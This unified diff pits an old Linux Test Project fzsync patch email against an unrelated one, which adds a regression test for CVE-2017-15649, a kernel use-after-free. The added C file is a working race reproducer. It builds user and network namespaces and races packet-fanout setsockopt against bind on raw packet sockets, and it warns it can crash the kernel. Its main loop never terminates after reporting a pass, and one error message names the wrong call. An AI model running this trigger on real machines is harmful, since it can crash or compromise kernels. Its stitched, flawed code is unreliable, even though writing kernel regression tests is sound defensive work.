@@ -1,83 +1,257 @@
-From: Li Wang <liwang@redhat.com>
-Date: Tue, 24 Sep 2019 18:58:01 +0800
-Subject: [LTP] [PATCH v3] fzsync: revoke thread_b if parent hits an
- accidental break
-Message-ID: <20190924105801.7616-1-liwang@redhat.com>
+From: Michael Moese <mmoese@suse.de>
+Date: Tue, 24 Sep 2019 13:21:59 +0200
+Subject: [LTP] [PATCH] Add a regression test for cve-2017-15649
+Message-ID: <20190924112159.18845-1-mmoese@suse.de>
 List-Id: <ltp.lists.linux.it>
 MIME-Version: 1.0
 Content-Type: text/plain; charset="us-ascii"
 Content-Transfer-Encoding: 7bit
 To: ltp@lists.linux.it
 
-We shouldn't rely entirely on the pair->exit flag in tst_fzsync_pair_cleanup()
-since there is possible to call tst_brk() at anyplace of thread_a, that will
-lead to timeout eventually because of thread_b(tst_fzsync_wait_b) fall into
-an infinite(no explicit condition to exit) loop.
+net/packet/af_packet.c in the Linux kernel before 4.13.6 allows local
+users to gain privileges via crafted system calls that trigger
+mishandling of packet_fanout data structures, because of a race
+condition (involving fanout_add and packet_do_bind) that leads to a
+use-after-free.
 
-Thread_a path trace:
-  tst_brk()
-    cleanup()
-      tst_fzsync_pair_cleanup()
-        SAFE_PTHREAD_JOIN(pair->thread_b, NULL)
-        #Or pthread_cancel(pair->thread_b)
+See https://ssd-disclosure.com/archives/3484 for more detail.
 
-We fix the problem via a way to kill thread_b with pthread_cancel.
-
-Work-around: [commit 2e74d996: Check recvmmsg exists before entering fuzzy loop]
-Signed-off-by: Li Wang <liwang@redhat.com>
-Cc: Richard Palethorpe <rpalethorpe@suse.com>
-Cc: Cyril Hrubis <chrubis@suse.cz>
+Signed-off-by: Michael Moese <mmoese@suse.de>
 ---
+ runtest/cve                    |   1 +
+ testcases/cve/.gitignore       |   1 +
+ testcases/cve/Makefile         |   1 +
+ testcases/cve/cve-2017-15649.c | 192 +++++++++++++++++++++++++++++++++
+ 4 files changed, 195 insertions(+)
+ create mode 100644 testcases/cve/cve-2017-15649.c
 
-Notes:
-    Patch V2: http://lists.linux.it/pipermail/ltp/2019-January/010489.html
-    Patch V1: http://lists.linux.it/pipermail/ltp/2019-January/010438.html
-
- include/tst_fuzzy_sync.h | 16 ++++++++++++----
- 1 file changed, 12 insertions(+), 4 deletions(-)
-
-diff --git a/include/tst_fuzzy_sync.h b/include/tst_fuzzy_sync.h
-index f9a1947c7..152f779cb 100644
---- a/include/tst_fuzzy_sync.h
-+++ b/include/tst_fuzzy_sync.h
-@@ -63,6 +63,7 @@
- #include <time.h>
- #include <math.h>
- #include <stdlib.h>
+diff --git a/runtest/cve b/runtest/cve
+index 33c9196e0..6c0597e71 100644
+--- a/runtest/cve
++++ b/runtest/cve
+@@ -40,3 +40,4 @@ cve-2017-1000380 snd_timer01
+ cve-2018-5803 sctp_big_chunk
+ cve-2018-1000001 realpath01
+ cve-2018-19854 crypto_user01
++cve-2017-15649 cve-2017-15649
+diff --git a/testcases/cve/.gitignore b/testcases/cve/.gitignore
+index 01a3e4c8f..94415b4e4 100644
+--- a/testcases/cve/.gitignore
++++ b/testcases/cve/.gitignore
+@@ -10,3 +10,4 @@ stack_clash
+ cve-2017-17052
+ cve-2017-16939
+ cve-2017-17053
++cve-2017-15649
+diff --git a/testcases/cve/Makefile b/testcases/cve/Makefile
+index da44fff60..6cf3b5af9 100644
+--- a/testcases/cve/Makefile
++++ b/testcases/cve/Makefile
+@@ -46,5 +46,6 @@ cve-2017-17052:	CFLAGS += -pthread
+ cve-2017-17053:	CFLAGS += -pthread
+ 
+ cve-2015-3290:	CFLAGS += -pthread
++cve-2017-15649: CFLAGS += -pthread
+ 
+ include $(top_srcdir)/include/mk/generic_leaf_target.mk
+diff --git a/testcases/cve/cve-2017-15649.c b/testcases/cve/cve-2017-15649.c
+new file mode 100644
+index 000000000..c19b5bdd4
+--- /dev/null
++++ b/testcases/cve/cve-2017-15649.c
+@@ -0,0 +1,192 @@
++// SPDX-License-Identifier: GPL-2.0-or-later
++/*
++ *   Copyright (c) 2019 Michael Moese <mmoese@suse.com>
++ */
++/* Regression test for CVE-2017-15649
++ * based on the reproducer at https://ssd-disclosure.com/archives/3484
++ *
++ * net/packet/af_packet.c in the Linux kernel before 4.13.6 allows local users
++ * to gain privileges via crafted system calls that trigger mishandling of
++ * packet_fanout data structures, because of a race condition (involving
++ * fanout_add and packet_do_bind) that leads to a use-after-free.
++ *
++ * Be careful! This test may crash your kernel!
++ */
++
 +#include <pthread.h>
- #include "tst_atomic.h"
- #include "tst_timer.h"
- #include "tst_safe_pthread.h"
-@@ -218,9 +219,13 @@ static void tst_fzsync_pair_init(struct tst_fzsync_pair *pair)
- static void tst_fzsync_pair_cleanup(struct tst_fzsync_pair *pair)
- {
- 	if (pair->thread_b) {
--		tst_atomic_store(1, &pair->exit);
--		SAFE_PTHREAD_JOIN(pair->thread_b, NULL);
--		pair->thread_b = 0;
-+		if (pair->exit == 1) {
-+			SAFE_PTHREAD_JOIN(pair->thread_b, NULL);
-+			pair->thread_b = 0;
-+		} else {
-+			pthread_cancel(pair->thread_b);
-+			pair->thread_b = 0;
-+		}
- 	}
- }
- 
-@@ -271,8 +276,11 @@ static void tst_fzsync_pair_reset(struct tst_fzsync_pair *pair,
- 	pair->a_cntr = 0;
- 	pair->b_cntr = 0;
- 	pair->exit = 0;
--	if (run_b)
-+	if (run_b) {
-+		pthread_setcanceltype(PTHREAD_CANCEL_ASYNCHRONOUS, NULL);
-+		pthread_setcancelstate(PTHREAD_CANCEL_ENABLE, NULL);
- 		SAFE_PTHREAD_CREATE(&pair->thread_b, 0, run_b, 0);
++#include <stdio.h>
++#include <sched.h>
++#include <string.h>
++#include <time.h>
++#include <net/if.h>
++#include <sys/types.h>
++#include <sys/socket.h>
++
++#include "tst_test.h"
++#include "tst_taint.h"
++#include "tst_safe_pthread.h"
++#include "tst_fuzzy_sync.h"
++#include "tst_capability.h"
++#include "lapi/syscalls.h"
++
++#define TEST_RUNTIME 15 /* seconds */
++
++static struct tst_fzsync_pair fzsync_pair;
++static int fd;
++static struct ifreq ifr;
++
++struct sockaddr_ll {
++	unsigned short	sll_family;
++	short		sll_protocol;
++	int		sll_ifindex;
++	unsigned short	sll_hatype;
++	unsigned char	sll_pkttype;
++	unsigned char	sll_halen;
++	unsigned char	sll_addr[8];
++};
++static struct sockaddr_ll addr;
++
++void *task1(void *unused)
++{
++	int fanout = 0x3;
++
++	if (tst_fzsync_run_a(&fzsync_pair)) {
++		setsockopt(fd, 0x107, 18, &fanout, sizeof(fanout));
++		tst_fzsync_end_race_a(&fzsync_pair);
 +	}
- 
- 	pair->exec_time_start = (float)tst_timeout_remaining();
- }
++	return unused;
++}
++
++void *task2(void *unused)
++{
++	if (tst_fzsync_run_b(&fzsync_pair)) {
++		bind(fd, (struct sockaddr *)&addr, sizeof(addr));
++		tst_fzsync_end_race_b(&fzsync_pair);
++	}
++	return unused;
++}
++
++static int write_file(const char *file, const char *what, ...)
++{
++	char buf[1024];
++	va_list args;
++	int len;
++	int my_fd;
++
++	va_start(args, what);
++	vsnprintf(buf, sizeof(buf), what, args);
++	va_end(args);
++
++	buf[sizeof(buf) - 1] = 0;
++	len = strlen(buf);
++
++	my_fd = SAFE_OPEN(file, O_WRONLY | O_CLOEXEC);
++
++	SAFE_WRITE(1, my_fd, buf, len);
++
++	SAFE_CLOSE(my_fd);
++
++	return 0;
++}
++
++static void setup(void)
++{
++	int real_uid = getuid();
++	int real_gid = getgid();
++
++	tst_fzsync_pair_init(&fzsync_pair);
++	tst_taint_init(TST_TAINT_W | TST_TAINT_D | TST_TAINT_L);
++
++	if (unshare(CLONE_NEWUSER) != 0) {
++		printf("[!] unprivileged user namespaces are not available\n");
++		perror("[-] unshare(CLONE_NEWUSER)");
++		exit(EXIT_FAILURE);
++	}
++
++	if (unshare(CLONE_NEWNET) != 0) {
++		perror("[-] unshare(CLONE_NEWUSER)");
++		exit(EXIT_FAILURE);
++	}
++
++	if (write_file("/proc/self/setgroups", "deny")) {
++		perror("[-] write_file(/proc/self/set_groups)");
++		exit(EXIT_FAILURE);
++	}
++
++	if (write_file("/proc/self/uid_map", "0 %d 1\n", real_uid)) {
++		perror("[-] write_file(/proc/self/uid_map)");
++		exit(EXIT_FAILURE);
++	}
++
++	if (write_file("/proc/self/gid_map", "0 %d 1\n", real_gid)) {
++		perror("[-] write_file(/proc/self/gid_map)");
++		exit(EXIT_FAILURE);
++	}
++}
++
++
++static void run(void)
++{
++	int index;
++	struct timespec start, now;
++	struct tst_cap_user_data before[2] = { {0} };
++	struct tst_cap_user_data after[2] = { {0} };
++
++	struct tst_cap_user_header hdr = {
++		.version = 0x20080522,
++		.pid = tst_syscall(__NR_gettid),
++	};
++
++	if (tst_capget(&hdr, before))
++		tst_brk(TBROK | TTERRNO, "tst_capget()");
++
++	clock_gettime(CLOCK_PROCESS_CPUTIME_ID, &start);
++
++	while (1) {
++		pthread_t thread1, thread2;
++
++
++		fd = SAFE_SOCKET(AF_PACKET, SOCK_RAW, PF_PACKET);
++
++		strcpy((char *) &ifr.ifr_name, "lo");
++		SAFE_IOCTL(fd, SIOCGIFINDEX, &ifr);
++		index = ifr.ifr_ifindex;
++
++		SAFE_IOCTL(fd, SIOCGIFFLAGS, &ifr);
++		ifr.ifr_flags &= ~(short) IFF_UP;
++
++		SAFE_IOCTL(fd, SIOCSIFFLAGS, &ifr);
++
++		addr.sll_family = AF_PACKET;
++		addr.sll_protocol = 0x0;
++		addr.sll_ifindex = index;
++
++		SAFE_PTHREAD_CREATE(&thread1, NULL, task1, NULL);
++		SAFE_PTHREAD_CREATE(&thread2, NULL, task2, NULL);
++		SAFE_PTHREAD_JOIN(thread1, NULL);
++		SAFE_PTHREAD_JOIN(thread2, NULL);
++
++		SAFE_CLOSE(fd);
++
++		if (tst_capget(&hdr, after))
++			tst_brk(TBROK | TTERRNO, "tst_capget()");
++
++		if (memcmp(before, after, sizeof(after)) || tst_taint_check())
++			tst_res(TFAIL, "kernel is vulnerable");
++
++		clock_gettime(CLOCK_PROCESS_CPUTIME_ID, &now);
++		if ((now.tv_sec - start.tv_sec) > TEST_RUNTIME)
++			tst_res(TPASS, "kernel seems to be not vulnerable");
++	}
++}
++
++static struct tst_test test = {
++	.test_all = run,
++	.setup = setup,
++	.caps = (struct tst_cap []) {
++		TST_CAP(TST_CAP_REQ, CAP_SYS_ADMIN),
++		TST_CAP(TST_CAP_REQ, CAP_NET_RAW),
++		TST_CAP(TST_CAP_DROP, CAP_SYS_ADMIN),
++		{},
++	},
++};
 -- 
-2.20.1
+2.23.0
 
